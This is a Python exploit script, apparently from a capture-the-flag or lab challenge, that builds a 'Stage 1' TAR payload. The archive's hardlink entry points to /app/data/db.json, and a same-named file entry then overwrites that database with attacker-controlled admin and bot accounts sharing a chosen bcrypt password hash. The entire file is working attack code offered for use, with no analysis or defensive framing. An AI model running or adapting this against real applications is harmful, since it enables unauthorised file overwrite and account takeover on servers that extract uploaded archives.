#!/usr/bin/env python3

from __future__ import annotations

import argparse
import io
import json
import tarfile
from pathlib import Path


DEFAULT_PASSWORD_HASH = (
    "$2b$10$dsC9VYxPVzqNFYGyoPn9Su0hIMeGcOKKsLkJzOhREKROG8COtvT5a"
)


def build_payload(password_hash: str) -> bytes:
    payload = {
        "users": [
            {
                "username": "admin",
                "password": password_hash,
                "role": "ledgermaster",
                "verified": True,
                "apiKey": None,
                "drawsId": None,
            },
            {
                "username": "bot",
                "password": password_hash,
                "role": "warden",
                "verified": True,
                "apiKey": "bbbbbbbbbbbb",
                "drawsId": None,
            },
        ],
        "convoys": [],
    }

    return json.dumps(payload, indent=2).encode("utf-8")


def build_archive(output: Path, password_hash: str) -> None:
    data = build_payload(password_hash)

    with tarfile.open(output, "w") as archive:
        link = tarfile.TarInfo("pivot")
        link.type = tarfile.LNKTYPE
        link.linkname = "/app/data/db.json"
        link.mode = 0o644
        archive.addfile(link)

        entry = tarfile.TarInfo("pivot")
        entry.size = len(data)
        entry.mode = 0o644
        archive.addfile(entry, io.BytesIO(data))


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description=(
            "Build the Archonyx Stage 1 TAR payload that overwrites "
            "/app/data/db.json through an absolute hardlink."
        )
    )
    parser.add_argument(
        "--output",
        type=Path,
        default=Path("stage1.tar"),
        help="Output TAR path. Default: stage1.tar",
    )
    parser.add_argument(
        "--password-hash",
        default=DEFAULT_PASSWORD_HASH,
        help="bcrypt hash written for the admin and preserved bot users.",
    )
    return parser.parse_args()


def main() -> None:
    args = parse_args()
    build_archive(args.output, args.password_hash)
    print(f"Created {args.output}")


if __name__ == "__main__":
    main()
